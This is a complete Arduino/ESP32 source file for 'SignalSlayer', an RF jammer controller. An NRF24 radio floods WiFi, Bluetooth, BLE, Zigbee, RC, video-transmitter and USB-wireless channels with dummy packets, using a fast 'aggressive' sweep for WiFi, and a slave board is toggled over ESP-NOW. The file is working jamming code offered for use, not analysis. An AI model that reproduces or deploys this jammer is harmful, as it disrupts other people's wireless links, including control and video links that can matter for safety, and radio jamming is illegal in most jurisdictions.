#include <Arduino.h>
#include <esp_wifi.h> // Required for setting the channel
/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/rfclown
   
   ESP-NOW Master Controller
   ________________________________________ */
   
#include "config.h"
#include "radio_settings.h"
#include "esp_now_common.h"

// Global Variables
OperationMode current_Mode = WiFi_MODULE;
bool current_Active = false;
struct_message command;
char dummy_payload[32] = "JAMMING";

// Using the FULL channel lists from the original headless version for max effect
const byte bluetooth_channels[] =        {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte ble_channels[]       =        {2, 26, 80};
const byte WiFi_channels[]      =        {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
const byte usbWireless_channels[] =      {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte rc_channels[]        =        {1, 3, 5, 7};
const byte zigbee_channels[]    =        {11, 15, 20, 25};
const byte nrf24_channels[]     =        {76, 78, 79};

static const char* kMenuLabels[] = {
  "WiFi", "Video TX", "RC", "BLE", "Bluetooth", "USB Wireless", "Zigbee", "NRF24"
};
static const int kMenuCount = sizeof(kMenuLabels)/sizeof(kMenuLabels[0]);

// --- ESP-NOW Functions ---

void sendCommand() {
  command.mode = current_Mode;
  command.active = current_Active;
  esp_err_t result = esp_now_send(slaveAddress, (uint8_t *) &command, sizeof(command));
  
  if (result == ESP_OK) {
    //Serial.println("Sent with success");
  } else {
    // It's common for this to fail occasionally, so we won't print an error to avoid spam
  }
}

// --- Radio Functions ---

void initialize_Jammer() {
  if (current_Active) {
    configureNrf();
    radio.openWritingPipe(0xE8E8F0F0E1LL); // Set a dummy address for writing
    Serial.println(">> JAMMING STARTED [AGGRESSIVE MODE] <<");
  } else {
    radio.powerDown();
    delay(100);
    Serial.println(">> JAMMING STOPPED <<");
  }
  sendCommand(); // Send command to slave
}

// --- Menu & Display ---

static int menuIndexFromMode(OperationMode m) {
  switch (m) {
    case WiFi_MODULE:         return 0;
    case VIDEO_TX_MODULE:     return 1;
    case RC_MODULE:           return 2;
    case BLE_MODULE:          return 3;
    case Bluetooth_MODULE:    return 4;
    case USB_WIRELESS_MODULE: return 5;
    case ZIGBEE_MODULE:       return 6;
    case NRF24_MODULE:        return 7;
    default: return 0;
  }
}

static OperationMode modeFromMenuIndex(int idx) {
  switch (idx) {
    case 0: return WiFi_MODULE;
    case 1: return VIDEO_TX_MODULE;
    case 2: return RC_MODULE;
    case 3: return BLE_MODULE;
    case 4: return Bluetooth_MODULE;
    case 5: return USB_WIRELESS_MODULE;
    case 6: return ZIGBEE_MODULE;
    case 7: return NRF24_MODULE;
    default: return WiFi_MODULE;
  }
}

void printStatus() {
  int idx = menuIndexFromMode(current_Mode);
  Serial.println("\n-----------------------------");
  Serial.println("DEVICE: MASTER");
  Serial.print("MODE: ");
  Serial.println(kMenuLabels[idx]);
  Serial.print("STATUS: ");
  if (current_Active) Serial.println("ACTIVE [AGGRESSIVE MODE]");
  else Serial.println("DEACTIVE [IDLE]");
  Serial.println("-----------------------------");
  Serial.println("Controls: [n]=Next, [p]=Prev, [t]=Toggle");
}

void handleSerialInput() {
  if (Serial.available() > 0) {
    char key = Serial.read();
    while(Serial.available() > 0) Serial.read(); // Flush buffer

    bool state_changed = false;
    if (key == 'n' || key == 'N') {
       int fromIdx = menuIndexFromMode(current_Mode);
       int toIdx   = (fromIdx == (kMenuCount - 1)) ? 0 : (fromIdx + 1);
       current_Mode = modeFromMenuIndex(toIdx);
       state_changed = true;
    } else if (key == 'p' || key == 'P') {
       int fromIdx = menuIndexFromMode(current_Mode);
       int toIdx   = (fromIdx == 0) ? (kMenuCount - 1) : (fromIdx - 1);
       current_Mode = modeFromMenuIndex(toIdx);
       state_changed = true;
    } else if (key == 't' || key == 'T') {
       current_Active = !current_Active;
       state_changed = true;
    }

    if (state_changed) {
      initialize_Jammer();
      printStatus();
    }
  }
}

// --- Main Setup and Loop ---

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n*** SignalSlayer ESP-NOW Edition (MASTER) ***");

  // Set device as a Wi-Fi Station
  WiFi.mode(WIFI_STA);
  // Set a fixed channel to ensure both devices are on the same one
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  Serial.print("Master MAC: ");
  Serial.println(WiFi.macAddress());

  // Init ESP-NOW
  if (esp_now_init() != ESP_OK) {
    Serial.println("Error initializing ESP-NOW");
    return;
  }

  // Register peer
  esp_now_peer_info_t peerInfo = {}; // Initialize the struct to all zeros
  memcpy(peerInfo.peer_addr, slaveAddress, 6);
  peerInfo.channel = 1; // Use the same channel we set
  peerInfo.ifidx = WIFI_IF_STA; // Specify the interface
  peerInfo.encrypt = false;
  
  if (esp_now_add_peer(&peerInfo) != ESP_OK){
    Serial.println("Failed to add peer");
    return;
  }

  // Radio Setup
  if (!setupRadio()) {
    Serial.println("\nFATAL: NRF24 radio not detected. Halting program.");
    while(1) { delay(100); }
  }
  
  initialize_Jammer();
  printStatus();
}

void loop() {
  handleSerialInput();
  
  if (current_Active) {
    // WiFi gets a special, more aggressive attack strategy
    if (current_Mode == WiFi_MODULE) {
      // Fast sequential sweep across all WiFi channels
      for (int i = 0; i < sizeof(WiFi_channels); i++) {
        radio.setChannel(WiFi_channels[i]);
        // Transmit a quick burst of packets on each channel
        for (int j = 0; j < 16; j++) {
          radio.write(&dummy_payload, sizeof(dummy_payload));
        }
      }
    } else {
      // Other modes use the original random-hopping strategy
      const byte* channels = nullptr;
      int channel_count = 0;
      
      switch(current_Mode) {
        case BLE_MODULE:          channels = ble_channels;          channel_count = sizeof(ble_channels); break;
        case Bluetooth_MODULE:    channels = bluetooth_channels;    channel_count = sizeof(bluetooth_channels); break;
        // WiFi_MODULE is handled above
        case USB_WIRELESS_MODULE: channels = usbWireless_channels;  channel_count = sizeof(usbWireless_channels); break;
        case VIDEO_TX_MODULE:     channels = videoTransmitter_channels; channel_count = sizeof(videoTransmitter_channels); break;
        case RC_MODULE:           channels = rc_channels;           channel_count = sizeof(rc_channels); break;
        case ZIGBEE_MODULE:       channels = zigbee_channels;       channel_count = sizeof(zigbee_channels); break;
        case NRF24_MODULE:        channels = nrf24_channels;        channel_count = sizeof(nrf24_channels); break;
        default: break;
      }

      if (channels && channel_count > 0) {
        byte channel = channels[random(0, channel_count)];
        radio.setChannel(channel);
        radio.write(&dummy_payload, sizeof(dummy_payload));
      }
    }
  } else {
    delay(100); // Small delay when idle
  }
}
